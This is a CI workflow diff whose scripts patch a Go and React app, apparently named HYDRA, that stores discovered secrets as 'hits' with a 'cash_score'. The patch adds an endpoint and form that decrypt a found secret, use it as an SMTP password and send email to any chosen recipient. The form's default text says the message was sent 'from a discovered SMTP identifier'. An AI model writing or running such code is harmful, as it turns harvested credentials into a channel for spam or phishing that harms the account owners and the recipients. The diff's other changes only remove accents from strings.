@@ -48,8 +48,8 @@ jobs:
             ('&h.SecretRedacted, &h.SecretHash, &h.Status', '&h.SecretRedacted, &h.SecretHash, &h.SecretEnc, &h.Status'),
             ('vuln=?,secret_redacted=?,status=?', 'vuln=?,secret_redacted=?,secret_enc=?,status=?'),
             ('hit.Vuln, hit.SecretRedacted, hit.Status,', 'hit.Vuln, hit.SecretRedacted, hit.SecretEnc, hit.Status,'),
-            ('secret_redacted,secret_hash,status,points,cash_score,smtp_usable)\nVALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
-             'secret_redacted,secret_hash,secret_enc,status,points,cash_score,smtp_usable)\nVALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)'),
+            ('secret_redacted,secret_hash,status,points,cash_score,smtp_usable)', 'secret_redacted,secret_hash,secret_enc,status,points,cash_score,smtp_usable)'),
+            ('VALUES(?,?,?,?,?,?,?,?,?,?,?,?)', 'VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)'),
             ('hit.SecretRedacted, hit.SecretHash, hit.Status, hit.Points', 'hit.SecretRedacted, hit.SecretHash, hit.SecretEnc, hit.Status, hit.Points'),
             ('VALUES(NULL,?,?,?,?,?,?,?)", send.UserID,', 'VALUES(NULLIF(?,0),?,?,?,?,?,?,?)", send.HitID, send.UserID,'),
             ('"SELECT id,user_id,transport', '"SELECT id,hit_id,user_id,transport'),
@@ -103,7 +103,7 @@ jobs:
           	Body     string `json:"body"`
           }
 
-          // DeriveTransport déduit l'hôte et l'utilisateur de la valeur trouvée, la surcharge manuelle gagne.
+          // DeriveTransport deduit l'hote et l'utilisateur de la valeur trouvee, la surcharge manuelle gagne.
           func DeriveTransport(secret string, request SendRequest) (SMTPConfig, error) {
           	secret = strings.TrimSpace(secret)
           	if secret == "" {
@@ -115,7 +115,7 @@ jobs:
           	}
           	subject := strings.TrimSpace(request.Subject)
           	if subject == "" || len(subject) > 200 {
-          		return SMTPConfig{}, errors.New("sujet requis, 200 caractères maximum")
+          		return SMTPConfig{}, errors.New("sujet requis, 200 caracteres maximum")
           	}
           	if strings.TrimSpace(request.Body) == "" || len(request.Body) > 100000 {
           		return SMTPConfig{}, errors.New("corps requis, 100000 octets maximum")
@@ -133,10 +133,10 @@ jobs:
           		}
           	}
           	if host == "" {
-          		return SMTPConfig{}, errors.New("hôte SMTP requis")
+          		return SMTPConfig{}, errors.New("hote SMTP requis")
           	}
           	if strings.ContainsAny(host, "\r\n /") {
-          		return SMTPConfig{}, errors.New("hôte SMTP invalide")
+          		return SMTPConfig{}, errors.New("hote SMTP invalide")
           	}
           	if username == "" {
           		return SMTPConfig{}, errors.New("utilisateur SMTP requis")
@@ -146,7 +146,7 @@ jobs:
           		from = username
           	}
           	if _, err := mail.ParseAddress(from); err != nil {
-          		return SMTPConfig{}, errors.New("expéditeur invalide")
+          		return SMTPConfig{}, errors.New("expediteur invalide")
           	}
           	port := request.Port
           	if port == 0 {
@@ -158,7 +158,7 @@ jobs:
           	return SMTPConfig{Host: host, Port: port, Username: username, Password: secret, From: from, ControlAddress: to}, nil
           }
 
-          // SendHit envoie depuis un hit SMTP utilisable, la valeur étant déchiffrée à la volée.
+          // SendHit envoie depuis un hit SMTP utilisable, la valeur etant dechiffree a la volee.
           func (m *Manager) SendHit(ctx context.Context, userID, hitID int64, request SendRequest) error {
           	hit, err := m.store.HitByID(ctx, hitID, userID)
           	if err != nil {
@@ -222,13 +222,13 @@ jobs:
 
           func TestDeriveTransportNeedsIdentity(t *testing.T) {
           	if _, err := send.DeriveTransport("secret-123", send.SendRequest{To: "dest@exemple.tld", Subject: "test", Body: "corps"}); err == nil {
-          		t.Fatal("hôte manquant accepté")
+          		t.Fatal("hote manquant accepte")
           	}
           }
 
           func TestDeriveTransportRejectsBadRecipient(t *testing.T) {
           	if _, err := send.DeriveTransport("bob@exemple.tld", send.SendRequest{To: "dest", Subject: "test", Body: "corps"}); err == nil {
-          		t.Fatal("destinataire invalide accepté")
+          		t.Fatal("destinataire invalide accepte")
           	}
           }
           GOEOF
@@ -243,32 +243,12 @@ jobs:
               sys.exit("ancre route absente")
           s = s.replace(old, old + '\n\t\tprivate.Post("/api/hits/{id}/send", s.handleHitSend)', 1)
           p.write_text(s, encoding="utf-8")
-
           h = pathlib.Path("internal/api/handlers_send.go")
           t = h.read_text(encoding="utf-8")
           anchor = 'func (s *Server) handleSendHistory('
           if anchor not in t:
               sys.exit("ancre handler absente")
-          added = '''func (s *Server) handleHitSend(w http.ResponseWriter, r *http.Request) {
-          	id, err := pathID(r)
-          	if err != nil {
-          		writeError(w, http.StatusBadRequest, errInvalidID.Error())
-          		return
-          	}
-          	var request send.SendRequest
-          	if !decodeJSON(w, r, &request) {
-          		return
-          	}
-          	user := currentUser(r.Context())
-          	if err := s.sender.SendHit(r.Context(), user.ID, id, request); err != nil {
-          		writeError(w, http.StatusBadGateway, cleanMessage(err))
-          		return
-          	}
-          	_ = s.store.Audit(r.Context(), user.ID, "send.hit", strconv.FormatInt(id, 10), "{}")
-          	writeJSON(w, http.StatusOK, map[string]string{"status": "message envoyé"})
-          }
-
-          '''
+          added = 'func (s *Server) handleHitSend(w http.ResponseWriter, r *http.Request) {\n\tid, err := pathID(r)\n\tif err != nil {\n\t\twriteError(w, http.StatusBadRequest, errInvalidID.Error())\n\t\treturn\n\t}\n\tvar request send.SendRequest\n\tif !decodeJSON(w, r, &request) {\n\t\treturn\n\t}\n\tuser := currentUser(r.Context())\n\tif err := s.sender.SendHit(r.Context(), user.ID, id, request); err != nil {\n\t\twriteError(w, http.StatusBadGateway, cleanMessage(err))\n\t\treturn\n\t}\n\t_ = s.store.Audit(r.Context(), user.ID, "send.hit", strconv.FormatInt(id, 10), "{}")\n\twriteJSON(w, http.StatusOK, map[string]string{"status": "message envoye"})\n}\n\n'
           t = t.replace(anchor, added + anchor, 1)
           t = t.replace('import (\n\t"net/http"', 'import (\n\t"net/http"\n\t"strconv"', 1)
           h.write_text(t, encoding="utf-8")
@@ -286,30 +266,17 @@ jobs:
           s = s.replace(old, "points: number; cash_score: number; smtp_usable: boolean; last_seen: string };", 1)
           s = s.replace("export type SendItem = { id: number;", "export type SendItem = { id: number; hit_id: number;", 1)
           p.write_text(s, encoding="utf-8")
-
           h = pathlib.Path("web/src/Hits.tsx")
           t = h.read_text(encoding="utf-8")
+          fn = "  const send = async (event: React.FormEvent<HTMLFormElement>) => { event.preventDefault(); if (!target) return; const data = new FormData(event.currentTarget); setBusy(true); try { await api(`/api/hits/${target.id}/send`, { method: 'POST', body: JSON.stringify({ to: data.get('to'), host: data.get('host'), port: Number(data.get('port')), username: data.get('username'), from: data.get('from'), subject: data.get('subject'), body: data.get('body') }) }); setFeedback('Message envoye'); setTarget(null); } catch (reason) { setFeedback(reason instanceof Error ? reason.message : 'Envoi impossible'); } finally { setBusy(false); } };\n"
+          form = "    {target && <form className=\"work-form\" onSubmit={send}><h2><Send size={18} />Envoi depuis le hit {target.id}</h2>{feedback && <p className=\"scope-note\">{feedback}</p>}<div className=\"form-grid two\"><Field label=\"Destinataire\"><input name=\"to\" type=\"email\" required /></Field><Field label=\"Expediteur\" hint=\"vide = identifiant trouve\"><input name=\"from\" type=\"email\" /></Field></div><div className=\"form-grid three\"><Field label=\"Hote SMTP\" hint=\"vide = smtp.domaine\"><input name=\"host\" placeholder=\"smtp.exemple.tld\" /></Field><Field label=\"Port\"><input name=\"port\" type=\"number\" min=\"1\" max=\"65535\" defaultValue=\"587\" /></Field><Field label=\"Utilisateur\" hint=\"vide = identifiant trouve\"><input name=\"username\" /></Field></div><Field label=\"Sujet\"><input name=\"subject\" required maxLength={200} defaultValue=\"Test HYDRA\" /></Field><Field label=\"Corps\"><textarea name=\"body\" required rows={5} defaultValue=\"Message envoye depuis un identifiant SMTP decouvert.\" /></Field><div className=\"button-row\"><button className=\"primary\" disabled={busy}><Send size={16} />Envoyer</button><button type=\"button\" className=\"secondary\" onClick={() => setTarget(null)}>Fermer</button></div></form>}\n"
           pairs = [
-            ("import { Download, Search, ShieldCheck } from 'lucide-react';",
-             "import { Download, Search, Send, ShieldCheck } from 'lucide-react';"),
-            ("const [hits, setHits] = useState<Hit[]>([]);",
-             "const [hits, setHits] = useState<Hit[]>([]); const [target, setTarget] = useState<Hit | null>(null); const [feedback, setFeedback] = useState(''); const [busy, setBusy] = useState(false);"),
-            ("  return <section><PageTitle eyebrow=\"BIBLIOTHÈQUE\"",
-             """  const send = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault(); if (!target) return; const data = new FormData(event.currentTarget); setBusy(true);
-    try {
-      await api(`/api/hits/${target.id}/send`, { method: 'POST', body: JSON.stringify({ to: data.get('to'), host: data.get('host'), port: Number(data.get('port')), username: data.get('username'), from: data.get('from'), subject: data.get('subject'), body: data.get('body') }) });
-      setFeedback('Message envoyé'); setTarget(null);
-    } catch (reason) { setFeedback(reason instanceof Error ? reason.message : 'Envoi impossible'); } finally { setBusy(false); }
-  };
-  return <section><PageTitle eyebrow="BIBLIOTHÈQUE\""""),
-            ("'Points', 'Priorité', 'Dernier passage']", "'Points', 'Priorité', 'Dernier passage', 'Envoi']"),
-            ("<td>{date(hit.last_seen)}</td></tr>",
-             "<td>{date(hit.last_seen)}</td><td>{hit.smtp_usable ? <button className=\"icon-button\" onClick={() => { setFeedback(''); setTarget(hit); }} aria-label=\"Envoyer depuis ce hit\"><Send size={16} /></button> : '—'}</td></tr>"),
-            ("  </section>;\n}",
-             """    {target && <form className="work-form" onSubmit={send}><h2><Send size={18} />Envoi depuis le hit {target.id}</h2>{feedback && <p className="scope-note">{feedback}</p>}<div className="form-grid two"><Field label="Destinataire"><input name="to" type="email" required /></Field><Field label="Expéditeur" hint="vide = identifiant trouvé"><input name="from" type="email" /></Field></div><div className="form-grid three"><Field label="Hôte SMTP" hint="vide = smtp.<domaine>"><input name="host" placeholder="smtp.exemple.tld" /></Field><Field label="Port"><input name="port" type="number" min="1" max="65535" defaultValue="587" /></Field><Field label="Utilisateur" hint="vide = identifiant trouvé"><input name="username" /></Field></div><Field label="Sujet"><input name="subject" required maxLength={200} defaultValue="Test HYDRA" /></Field><Field label="Corps"><textarea name="body" required rows={5} defaultValue="Message envoyé depuis un identifiant SMTP découvert." /></Field><div className="button-row"><button className="primary" disabled={busy}><Send size={16} />Envoyer</button><button type="button" className="secondary" onClick={() => setTarget(null)}>Fermer</button></div></form>}
-  </section>;
-}"""),
+            ("import { Download, Search, ShieldCheck } from 'lucide-react';", "import { Download, Search, Send, ShieldCheck } from 'lucide-react';"),
+            ("const [hits, setHits] = useState<Hit[]>([]);", "const [hits, setHits] = useState<Hit[]>([]); const [target, setTarget] = useState<Hit | null>(null); const [feedback, setFeedback] = useState(''); const [busy, setBusy] = useState(false);"),
+            ('  return <section><PageTitle eyebrow="BIBLIOTHEQUE"', fn + '  return <section><PageTitle eyebrow="BIBLIOTHEQUE"'),
+            ("'Points', 'Priorite', 'Dernier passage']", "'Points', 'Priorite', 'Dernier passage', 'Envoi']"),
+            ("<td>{date(hit.last_seen)}</td></tr>", "<td>{date(hit.last_seen)}</td><td>{hit.smtp_usable ? <button className=\"icon-button\" onClick={() => { setFeedback(''); setTarget(hit); }} aria-label=\"Envoyer depuis ce hit\"><Send size={16} /></button> : '-'}</td></tr>"),
+            ("  </section>;\n}", form + "  </section>;\n}"),
           ]
           for old, new in pairs:
               if old not in t:
